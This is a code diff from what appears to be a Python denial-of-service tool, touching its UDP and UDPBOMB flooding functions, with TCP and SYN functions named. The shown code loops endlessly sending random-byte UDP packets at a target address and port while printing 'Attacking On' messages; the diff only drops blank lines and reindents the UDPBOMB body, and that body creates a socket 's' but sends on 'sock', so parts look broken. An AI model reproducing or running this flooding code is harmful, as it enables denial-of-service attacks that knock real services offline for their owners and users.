@@ -80,7 +80,6 @@ def TCP():
 def UDP():
     packet = random.randint(1024, 8192)
     byte_packet = random._urandom(packet)
-
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -99,23 +98,22 @@ def UDP():
 def UDPBOMB():
     packet = random.randint(1024, 8192)
     byte_packet = random._urandom(packet)
-
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket .SO_SNDBUF, 65507)
-            sock.connect((ip,port))
-            sock.send(byte_packet)
-            sock.send(byte_packet)
-            for x in range(times):
-                sock.sendall(byte_packet)
-                sock.sendall(byte_packet)
-            print(f"Attacking On {ip}:{port} with UDP")
-        except socket.error:
-            print(f"Attacking On {ip}:{port} with UDP")
-            sock.close()
+           s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+           s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+           s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+           s.setsockopt(socket.SOL_SOCKET, socket .SO_SNDBUF, 65507)
+           sock.connect((ip,port))
+           sock.send(byte_packet)
+           sock.send(byte_packet)
+           for x in range(times):
+               sock.sendall(byte_packet)
+               sock.sendall(byte_packet)
+           print(f"Attacking On {ip}:{port} with UDP")
+       except socket.error:
+           print(f"Attacking On {ip}:{port} with UDP")
+           sock.close()
     
         
 def SYN():
